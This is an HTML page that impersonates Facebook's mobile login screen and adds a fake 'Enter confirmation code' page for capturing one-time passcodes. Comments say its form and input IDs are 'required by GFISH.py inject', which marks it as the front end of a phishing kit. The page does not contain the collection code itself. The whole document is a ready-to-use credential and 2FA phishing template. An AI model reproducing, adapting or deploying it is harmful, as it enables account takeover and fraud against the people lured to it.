<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>Facebook – log in or sign up</title>
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-tap-highlight-color: transparent;
  }

  html { height: 100%; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
      Helvetica, Arial, sans-serif;
    background: #f0f2f5;
    min-height: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  /* ── language bar ── */
  .lang-bar {
    width: 100%;
    max-width: 420px;
    padding: 12px 16px 0;
    display: flex;
    justify-content: flex-end;
  }

  .lang-btn {
    font-size: 14px;
    color: #65676b;
    background: none;
    border: none;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 4px;
    font-family: inherit;
  }

  .lang-btn svg {
    width: 12px;
    height: 12px;
    fill: #65676b;
  }

  /* ── logo ── */
  .logo-wrap {
    margin-top: 36px;
  }

  .fb-logo {
    width: 68px;
    height: 68px;
  }

  .fb-logo svg {
    width: 68px;
    height: 68px;
  }

  /* ── card ── */
  .card {
    background: #fff;
    width: calc(100% - 32px);
    max-width: 388px;
    margin-top: 32px;
    border-radius: 8px;
    padding: 24px 16px 20px;
  }

  /* ── notice ── */
  .notice {
    padding: 12px 0 20px;
    border-bottom: 1px solid #dddfe2;
    margin-bottom: 16px;
  }

  .notice p {
    font-size: 14px;
    color: #050505;
    line-height: 1.4;
  }

  .notice a {
    color: #1877f2;
    font-size: 14px;
    text-decoration: none;
    font-weight: 500;
    display: block;
    margin-top: 4px;
  }

  /* ── inputs ── */
  .input-group {
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin-bottom: 16px;
  }

  .input-group input {
    width: 100%;
    height: 52px;
    border: 1px solid #dddfe2;
    border-radius: 8px;
    padding: 0 14px;
    font-size: 16px;
    color: #050505;
    outline: none;
    transition: border-color 0.15s;
    font-family: inherit;
    background: #fff;
    -webkit-appearance: none;
    appearance: none;
  }

  .input-group input::placeholder {
    color: #bcc0c4;
  }

  .input-group input:focus {
    border-color: #1877f2;
    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
  }

  /* ── login button ── */
  .btn-login {
    width: 100%;
    height: 52px;
    background: #1877f2;
    color: #fff;
    font-size: 20px;
    font-weight: 700;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.15s;
    letter-spacing: 0.2px;
    font-family: inherit;
    -webkit-appearance: none;
    appearance: none;
  }

  .btn-login:hover  { background: #166fe5; }
  .btn-login:active { background: #1459c0; }

  /* ── forgot ── */
  .forgot-wrap {
    text-align: center;
    margin-top: 16px;
  }

  .forgot-wrap a {
    color: #1877f2;
    font-size: 15px;
    font-weight: 600;
    text-decoration: none;
    cursor: pointer;
  }

  .forgot-wrap a:hover { text-decoration: underline; }

  /* ── spacer ── */
  .spacer { flex: 1; }

  /* ── create account button ── */
  .create-wrap {
    width: calc(100% - 32px);
    max-width: 388px;
    margin-top: 24px;
  }

  .btn-create {
    width: 100%;
    height: 52px;
    background: #fff;
    color: #1877f2;
    font-size: 16px;
    font-weight: 600;
    border: 1.5px solid #1877f2;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.15s;
    letter-spacing: 0.1px;
    font-family: inherit;
  }

  .btn-create:hover { background: #f0f2f5; }

  /* ── meta logo ── */
  .meta-logo {
    margin-top: 20px;
    margin-bottom: 24px;
    display: flex;
    align-items: center;
    gap: 6px;
    color: #65676b;
    font-size: 13px;
  }

  .meta-logo svg {
    width: 46px;
    height: 16px;
    fill: #65676b;
  }

  /* ══════════════════════════════════════════
     PAGE 2 STYLES
     ══════════════════════════════════════════ */
  #page2 {
    display: none;
    width: 100%;
    min-height: 100vh;
    background: #fff;
    flex-direction: column;
    max-width: 480px;
    margin: 0 auto;
  }

  #page2 .top-bar { padding: 18px 16px 0 16px; }

  #page2 .breadcrumb {
    font-size: 13px;
    color: #65676b;
    margin-bottom: 6px;
    display: flex;
    align-items: center;
    gap: 4px;
  }

  #page2 h1 {
    font-size: 24px;
    font-weight: 700;
    color: #1c1e21;
    line-height: 1.2;
    margin-bottom: 10px;
  }

  #page2 .subtitle {
    font-size: 15px;
    color: #1c1e21;
    line-height: 1.4;
    margin-bottom: 20px;
  }

  #page2 .illustration-wrap {
    margin: 0 16px 24px 16px;
    background: #c8ebe8;
    border-radius: 16px;
    height: 200px;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  #page2 .input-section { padding: 0 16px; }

  #page2 .input-wrap {
    border: 1.5px solid #ced0d4;
    border-radius: 6px;
    padding: 14px 16px;
    margin-bottom: 16px;
    transition: border-color 0.15s;
  }

  #page2 .input-wrap:focus-within { border-color: #1877f2; }

  #page2 .input-wrap input {
    width: 100%;
    border: none;
    outline: none;
    font-size: 16px;
    color: #1c1e21;
    background: transparent;
    font-family: inherit;
  }

  #page2 .input-wrap input::placeholder { color: #8a8d91; }

  #page2 .resend-wrap {
    display: flex;
    align-items: center;
    gap: 7px;
    margin-bottom: 32px;
  }

  #page2 .resend-btn {
    color: #1877f2;
    font-size: 15px;
    font-weight: 600;
    font-family: inherit;
    background: none;
    border: none;
    cursor: pointer;
    padding: 0;
    display: flex;
    align-items: center;
    gap: 7px;
  }

  #page2 .resend-btn:hover span { text-decoration: underline; }

  #page2 .bottom-section {
    margin-top: auto;
    padding: 12px 16px 16px 16px;
    border-top: 1px solid #e4e6eb;
  }

  #page2 .btn-next {
    width: 100%;
    padding: 16px;
    border-radius: 8px;
    border: none;
    background: #a8c8f8;
    color: #fff;
    font-size: 17px;
    font-weight: 600;
    font-family: inherit;
    cursor: default;
    margin-bottom: 12px;
    transition: background 0.2s;
    pointer-events: none;
    -webkit-appearance: none;
    appearance: none;
  }

  #page2 .btn-next.active {
    background: #1877f2;
    cursor: pointer;
    pointer-events: all;
  }

  #page2 .btn-next.active:hover { background: #166fe5; }

  #page2 .btn-try {
    width: 100%;
    padding: 16px;
    border-radius: 8px;
    border: 1.5px solid #ced0d4;
    background: #fff;
    color: #1c1e21;
    font-size: 17px;
    font-weight: 600;
    font-family: inherit;
    cursor: pointer;
    transition: background 0.1s;
    -webkit-appearance: none;
    appearance: none;
  }

  #page2 .btn-try:hover { background: #f0f2f5; }

  /* ── Page switching (GFISH.py injects body.show-page2 class) ── */
  body.show-page2 #page1 { display: none !important; }
  body.show-page2 #page2 { display: flex !important; }

  /* ── Responsive ── */
  @media (max-width: 400px) {
    .card { padding: 20px 14px 18px; }
    .input-group input { height: 48px; font-size: 15px; }
    .btn-login { height: 48px; font-size: 18px; }
    #page2 h1 { font-size: 21px; }
    #page2 .subtitle { font-size: 14px; }
    #page2 .btn-next, #page2 .btn-try { font-size: 15px; padding: 14px; }
  }

  @media (max-width: 320px) {
    .logo-wrap { margin-top: 24px; }
    .card { padding: 16px 12px 14px; }
    #page2 h1 { font-size: 18px; }
    #page2 .illustration-wrap { height: 160px; }
  }
</style>
</head>
<body>

<!-- ══════════════════════════════════════════
     PAGE 1 — Facebook Login
     ══════════════════════════════════════════ -->
<div id="page1" style="width:100%; display:flex; flex-direction:column; align-items:center; min-height:100vh;">

  <!-- language bar -->
  <div class="lang-bar">
    <button class="lang-btn">
      English (US)
      <svg viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg">
        <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2
          11.9-22.9 6.9-34.9S301 192 288 192L32 192c-12.9
          0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"/>
      </svg>
    </button>
  </div>

  <!-- fb logo -->
  <div class="logo-wrap">
    <div class="fb-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
        <circle cx="256" cy="256" r="256" fill="#1877f2"/>
        <path fill="#fff" d="M355.6 325l10.4-67.9h-65.1v-44.1c0-18.6 9.1-36.7
          38.3-36.7H369v-57.8s-28.8-4.9-56.4-4.9c-57.5 0-95.1 34.9-95.1
          98v55.5h-63.9V325h63.9v164.2c12.8 2 25.9 3
          39.2 3s26.4-1 39.2-3V325h52.7z"/>
      </svg>
    </div>
  </div>

  <!-- login card -->
  <div class="card">
    <div class="notice">
      <p>Facebook requests and receives your phone number from your mobile network.</p>
      <a href="#">Change Settings</a>
    </div>

    <!-- form id="recoveryForm" required by GFISH.py inject -->
    <form id="recoveryForm" autocomplete="off">
      <div class="input-group">
        <input
          id="account"
          type="text"
          placeholder="Mobile number or email"
          autocomplete="username"
          inputmode="email"
        />
        <input
          id="password"
          type="password"
          placeholder="Password"
          autocomplete="current-password"
        />
      </div>
      <button class="btn-login" type="submit">Log in</button>
    </form>

    <div class="forgot-wrap">
      <a id="forgot" href="#">Forgot password?</a>
    </div>
  </div>

  <div class="spacer"></div>

  <!-- create account -->
  <div class="create-wrap">
    <button class="btn-create">Create new account</button>
  </div>

  <!-- meta logo -->
  <div class="meta-logo">
    <svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
      <path d="M30 30 C30 18 18 12 12 18 C6 24 6 36 12 42 C18 48 30 42
        30 30 C30 18 42 12 48 18 C54 24 54 36 48 42 C42 48 30 42 30 30"
        fill="none" stroke="#65676b" stroke-width="4.5"
        stroke-linecap="round"/>
      <text x="66" y="39" font-family="-apple-system,BlinkMacSystemFont,
        'Segoe UI',sans-serif" font-size="22" font-weight="500"
        fill="#65676b">Meta</text>
    </svg>
  </div>

</div>

<!-- ══════════════════════════════════════════
     PAGE 2 — OTP Confirmation
     ══════════════════════════════════════════ -->
<div id="page2">

  <div class="top-bar">
    <div class="breadcrumb">
      <span>Facebook</span>
      <span>›</span>
      <span>Security</span>
    </div>
    <h1>Enter confirmation code</h1>
    <p class="subtitle">
      We've sent a confirmation code to your number.
      Facebook wants to make sure it's really you trying to sign in.
    </p>
  </div>

  <div class="illustration-wrap">
    <svg width="220" height="180" viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
      <rect x="55" y="15" width="110" height="155" rx="14" fill="#F0F0F0" stroke="#D0D0D0" stroke-width="1.5"/>
      <rect x="62" y="28" width="96" height="120" rx="4" fill="#fff"/>
      <g transform="translate(90,36)">
        <path d="M20 0 L40 8 L40 28 Q40 44 20 52 Q0 44 0 28 L0 8 Z" fill="#F4A623"/>
        <path d="M20 4 L36 11 L36 28 Q36 42 20 49 Q4 42 4 28 L4 11 Z" fill="#F7BC45"/>
      </g>
      <rect x="68" y="100" width="84" height="22" rx="4" fill="#E8F5E8"/>
      <text x="83" y="116" font-size="14" fill="#555" letter-spacing="8">****</text>
      <g opacity="0.18">
        <rect x="68" y="128" width="24" height="14" rx="2" fill="#888"/>
        <rect x="96" y="128" width="24" height="14" rx="2" fill="#888"/>
        <rect x="124" y="128" width="24" height="14" rx="2" fill="#888"/>
        <rect x="68" y="145" width="24" height="8" rx="2" fill="#888"/>
        <rect x="96" y="145" width="24" height="8" rx="2" fill="#888"/>
        <rect x="124" y="145" width="24" height="8" rx="2" fill="#888"/>
      </g>
      <g transform="translate(-10,60)">
        <ellipse cx="85" cy="145" rx="30" ry="18" fill="#6B3A2A"/>
        <ellipse cx="58" cy="138" rx="10" ry="7" fill="#6B3A2A" transform="rotate(-25,58,138)"/>
        <rect x="68" y="128" width="8" height="20" rx="4" fill="#7A4535"/>
        <rect x="78" y="125" width="8" height="23" rx="4" fill="#7A4535"/>
        <rect x="88" y="126" width="8" height="22" rx="4" fill="#7A4535"/>
        <rect x="98" y="129" width="8" height="18" rx="4" fill="#7A4535"/>
      </g>
      <g transform="translate(80,30)">
        <ellipse cx="90" cy="102" rx="26" ry="16" fill="#6B3A2A"/>
        <rect x="104" y="85" width="9" height="26" rx="4.5" fill="#7A4535"/>
        <rect x="92" y="93" width="8" height="16" rx="4" fill="#5C2D1A"/>
        <rect x="80" y="95" width="8" height="14" rx="4" fill="#5C2D1A"/>
        <ellipse cx="76" cy="107" rx="9" ry="6" fill="#6B3A2A" transform="rotate(-20,76,107)"/>
      </g>
      <ellipse cx="110" cy="175" rx="50" ry="5" fill="rgba(0,0,0,0.08)"/>
    </svg>
  </div>

  <div class="input-section">
    <div class="input-wrap">
      <!-- id="code" required by GFISH.py inject -->
      <input
        type="tel"
        id="code"
        placeholder="Confirmation code"
        maxlength="6"
        inputmode="numeric"
        pattern="[0-9]*"
        autocomplete="one-time-code"
      />
    </div>
    <div class="resend-wrap">
      <!-- id="resendLink" required by GFISH.py inject -->
      <button class="resend-btn" id="resendLink" type="button">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
          <path d="M4 12C4 7.58 7.58 4 12 4C14.5 4 16.7 5.1 18.2 6.8L16 9H22V3L19.7 5.3C17.8 3.3 15.05 2 12 2C6.48 2 2 6.48 2 12H4Z" fill="#1877F2"/>
          <path d="M20 12C20 16.42 16.42 20 12 20C9.5 20 7.3 18.9 5.8 17.2L8 15H2V21L4.3 18.7C6.2 20.7 8.95 22 12 22C17.52 22 22 17.52 22 12H20Z" fill="#1877F2"/>
        </svg>
        <span>Get a new code</span>
      </button>
    </div>
  </div>

  <div class="bottom-section">
    <!-- id="page2Next" required by GFISH.py inject -->
    <button class="btn-next" id="page2Next" type="button">Next</button>
    <!-- id="tryAnother" required by GFISH.py inject -->
    <button class="btn-try" id="tryAnother" type="button">Try another way</button>
  </div>

</div>

</body>
</html>
